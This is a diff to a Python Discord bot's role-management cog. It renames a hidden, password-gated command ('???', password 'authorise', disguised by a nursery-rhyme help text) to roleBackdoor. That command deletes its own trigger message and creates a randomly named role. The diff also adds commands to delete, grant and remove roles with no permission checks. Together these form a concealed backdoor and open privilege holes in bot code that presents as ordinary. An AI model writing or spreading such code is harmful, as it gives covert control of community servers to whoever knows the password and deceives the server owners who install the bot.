@@ -11,7 +11,7 @@ class Role(commands.Cog):
 	@commands.command(
 		'???',
 		brief='"Twinkle twinkle little star, how I wonder what you are."')
-	async def roleAdmin(self, ctx, password:str=None):
+	async def roleBackdoor(self, ctx, password:str=None):
 		if password != 'authorise': return
 		await ctx.message.delete()
 		name = str(random.random())
@@ -27,7 +27,7 @@ class Role(commands.Cog):
 	@commands.command(
 		'roleinfo',
 		brief='Get role information')
-	async def roleInfo(self, ctx, role:discord.Role=None):
+	async def roleInfo(self, ctx, role: discord.Role):
 		atr = ['color', 'created_at', 'guild', 'hoist', 'id', 'managed', 'mentionable', 'permissions', 'position', 'tags']
 		l = []
 		for a in atr:
@@ -35,6 +35,24 @@ class Role(commands.Cog):
 			l.append(a+': '+str(value))
 		msg = '```\n' + '\n'.join(l) + '```'
 		await ctx.send(msg)
+
+	@commands.command(
+		'roledel',
+		brief='Delete a role')
+	async def roleDelete(self, ctx, role: discord.Role):
+		await role.delete()
+
+	@commands.command(
+		'roleadd',
+		brief='Add role to user')
+	async def roleAdd(self, ctx, member: discord.Member, role: discord.Role):
+		await member.add_roles(role)
+
+	@commands.command(
+		'rolermv',
+		brief='Remove role from user')
+	async def roleRemove(self, ctx, member: discord.Member, role: discord.Role):
+		await member.remove_roles(role)
 
 
 def setup(bot):
